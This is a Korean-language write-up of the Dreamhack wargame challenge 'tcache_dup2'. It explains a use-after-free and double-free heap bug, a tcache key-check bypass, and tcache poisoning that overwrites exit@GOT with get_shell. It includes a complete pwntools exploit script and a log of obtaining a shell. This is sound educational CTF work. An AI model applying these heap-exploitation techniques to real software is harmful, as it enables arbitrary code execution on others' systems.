# ✏️ tcache_dup2
> https://dreamhack.io/wargame/challenges/67

## 📄 Vulnerability & Code Analysis

`delete_heap()`은 `free(ptr[idx])`만 호출하고 `ptr[idx]`를 NULL로 초기화하지 않는다. 그래서 해제된 청크에 대해 `modify_heap()`으로 데이터를 다시 쓸 수 있는 **Use-After-Free**, 그리고 같은 idx를 여러 번 `delete_heap()`할 수 있는 **Double Free** 조건이 성립한다.

`modify_heap()`은 `size > 0x10`이면 종료시키지만, 그 이하 크기에서는 자유롭게 청크 내부를 덮어쓸 수 있어 tcache 청크의 `next`/`key` 필드(합쳐서 16바이트) 전체를 UAF로 조작할 수 있다.

또한 `create_heap()`, `modify_heap()`, `delete_heap()` 어디서든 `idx >= 7`이면 곧바로 `exit(0)`이 호출된다. 이 호출은 힙 상태와 무관하게 항상 결정적으로 발생하는 트리거 지점이라는 게 이번 풀이의 핵심이다.

바이너리는 Partial RELRO + No PIE라 GOT가 쓰기 가능하고 바이너리 내부 주소는 리크 없이 고정 오프셋으로 계산 가능하다.

## 🗡️ Exploit / Solver Strategy

1. 같은 크기(0x10)의 청크 3개(idx 0, 1, 2)를 생성한다.
2. idx 2, 1, 0 순서로 `free()`하여 tcache 리스트를 `0 → 1 → 2`로 쌓는다.
3. `modify_heap(0)`으로 청크 0의 `next`/`key` 필드를 임의 값(`'A'*16`)으로 덮어쓴다. `key`가 실제 tcache 주소와 달라지므로, 이후 같은 idx를 다시 `free()`해도 double free 검사(`e->key == tcache`)를 통과한다.
4. 청크 0을 다시 `free()`한다 — 검사를 우회했으므로 진짜 double free가 성립하고, `tcache_put()`이 청크 0의 `next`를 현재 head(청크 0 자신)로 다시 세팅해 `0 → 0` 순환 구조가 만들어진다.
5. `malloc`으로 청크 0을 받아 그 자리에 `exit@GOT` 주소를 써서 tcache poisoning을 수행한다.
6. `malloc`을 한 번 더 호출해 head를 `exit@GOT`로 진행시킨다 (이때 쓰는 데이터는 무관).
7. `malloc`을 한 번 더 호출하면 `exit@GOT` 주소 자체가 반환되고, 여기에 `get_shell` 주소를 써서 GOT를 덮어쓴다.
8. `modify_heap()`을 idx=7로 호출해 `idx >= 7` 분기의 `exit(0)`을 트리거한다. 이 호출은 `exit@GOT`를 거치므로 실제로는 `get_shell()`이 실행되어 셸을 얻는다.

처음엔 `free@GOT`를 타겟으로 잡고 이후 `delete_heap()`의 `free()` 호출로 트리거하려 했으나, GOT 주소(`0x404018`) 계산 과정에서 근거 없이 "16바이트 정렬이 안 맞아 tcache가 이 주소를 거부한다"고 판단해 타겟을 임의로 8바이트 이동시켰고, 그 결과 `readelf -r` 확인상 무관한 인접 GOT 슬롯을 덮어써 프로세스가 죽었다. glibc 2.30 소스(`tcache_get()`)를 직접 확인한 결과 그런 정렬 검사는 애초에 존재하지 않았다. 이후 poisoning 대상(`exit@GOT`)과 트리거 지점(`idx >= 7` 분기)을 완전히 분리하는 방식으로 바꾸면서 힙 상태와 무관하게 안정적으로 성공했다.

## 💻 Final Payload or Solver

```python
from pwn import *
import sys

p = remote('host3.dreamhack.games', 8567)
e = ELF('./tcache_dup2')
libc = ELF('./libc-2.30.so')

def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', data)

def modify(idx, size, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', data)

def delete(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b': ', str(idx).encode())


create(0x10, b'AAAAAAAA')
create(0x10, b'BBBBBBBB')
create(0x10, b'CCCCCCCC')
delete(2)
delete(1)
delete(0)

modify(0, 16, b'AAAAAAAAAAAAAAAA')

delete(0)

create(0x10, p64(e.got['exit']))
create(0x10, b'BBBBBBBB')
create(0x10, p64(e.symbols['get_shell']))

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b': ', b'7')

p.interactive()
```

로컬 실행 시 문제 폴더에 제공된 libc-2.30.so를 반드시 `LD_PRELOAD`로 지정해야 한다. 단, 로더(`ld.so`) 버전이 시스템 기본과 크게 다르면 `Inconsistency detected by ld.so` 에러가 날 수 있어, 이 경우 원격에서 먼저 검증하는 편이 낫다.

## 🏳️ cat flag
```bash
(.venv) (base) ➜  tcache_dup2 pypwn tcache_dup2.py                      [|] Opening connection to host3.dreamhack.games on port 8567: Trying 23.[+] Opening connection to host3.dreamhack.games on port 8567: Done
[*] '/home/daniel/dreamhack/pwn/tcache_dup2/tcache_dup2'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[*] '/home/daniel/dreamhack/pwn/tcache_dup2/libc-2.30.so'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[*] Switching to interactive mode
$ cat flag
DH{<FLAG_REDACTED>}
$
[*] Interrupted
[*] Closed connection to host3.dreamhack.games port 8567
```
